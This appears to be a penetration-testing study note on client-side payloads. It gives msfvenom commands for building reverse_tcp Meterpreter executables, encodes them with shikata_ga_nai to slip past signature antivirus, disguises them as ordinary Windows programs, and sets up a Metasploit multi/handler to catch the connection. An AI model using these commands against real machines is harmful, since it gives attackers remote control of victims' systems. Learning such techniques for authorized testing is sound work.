# Payloads

## Overview

A payload is the part of an exploit or delivery chain that runs on the target after execution. In client-side attacks, the payload is usually delivered through a malicious file or executable that the victim opens, which then connects back to the attacker.

Client-side attacks rely on **human interaction** instead of a service vulnerability. Because the payload is stored on disk, antivirus detection is an important concern.

## Client-Side Attacks

Client-side attacks usually use social engineering to get the target to run a malicious file. Common examples include:

- Malicious documents.
- Portable executables.
- Fake installers or droppers.

The goal is to get the target system to execute the payload and open a reverse connection back to the attacker.

## Msfvenom

**Msfvenom** is a command-line utility used to generate and encode Metasploit payloads for different operating systems and web platforms. It combines the old `msfpayload` and `msfencode` tools into one.

It is commonly used to generate Meterpreter payloads that can be delivered to a client system. Once the file is executed, it connects back to a payload handler and gives remote access.

### Common Syntax

```bash
msfvenom -p <payload> LHOST=<your_ip> LPORT=<port> -f <format> -o <output_file>
```

### Example

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o payload.exe
```

### Command Explanation

- `msfvenom` — generates the payload.
- `-p windows/meterpreter/reverse_tcp` — selects the payload type.
- `LHOST=<your_ip>` — sets the attacker IP address, where the reverse connection will return.
- `LPORT=4444` — sets the listening port on the attacker side.
- `-f exe` — outputs the payload in Windows executable format.
- `-o payload.exe` — saves the payload to a file.

## Encoding Payloads

Because many antivirus solutions detect malicious files using signatures, payloads can be encoded to change their appearance and bypass older signature-based detection.

Encoding modifies the shellcode so the payload signature changes, while keeping the payload functional.

### Example

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe
```

### Command Explanation

- `-e x86/shikata_ga_nai` — selects the encoder.
- `-i 3` — applies the encoder three times.
- `-f exe` — outputs a Windows executable.
- `-o encoded_payload.exe` — saves the encoded payload.

### Important Note

Encoding is mainly useful against older signature-based antivirus solutions. It does not guarantee evasion against modern defenses.

## Shellcode

**Shellcode** is a small piece of code used as a payload in exploitation. It is called shellcode because its goal is often to provide a command shell on the target system.

Shellcode is what actually runs after exploitation or payload delivery.

## Injecting Payloads Into Windows Portable Executables

A common client-side technique is to inject a payload into a Windows PE file so the file looks legitimate but runs malicious code when opened.

### Example

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe -o malicious.exe
```

This creates a standalone Windows executable that can be delivered to the target.

### Optional: Add Encoding

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o malicious.exe
```

This generates an encoded executable that may help bypass simple antivirus detection.

## Payload Handler

After generating the payload, Metasploit must be listening for the incoming connection.

### Example Handler Setup

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

### Command Explanation

- `use exploit/multi/handler` — starts a listener for the payload.
- `set PAYLOAD windows/meterpreter/reverse_tcp` — matches the handler to the generated payload.
- `set LHOST <your_ip>` — sets the attacker IP address.
- `set LPORT 4444` — sets the listening port.
- `run` — starts the listener and waits for the target connection.

## Why This Matters

Payloads are the part that gives the attacker control after delivery and execution. In client-side attacks, the most important steps are generating the payload, optionally encoding it, delivering it, and then catching the reverse connection with a handler.

## Key Idea

Msfvenom is used to generate payloads, encoding can help against basic antivirus detection, and a multi/handler is needed to receive the connection when the payload executes.
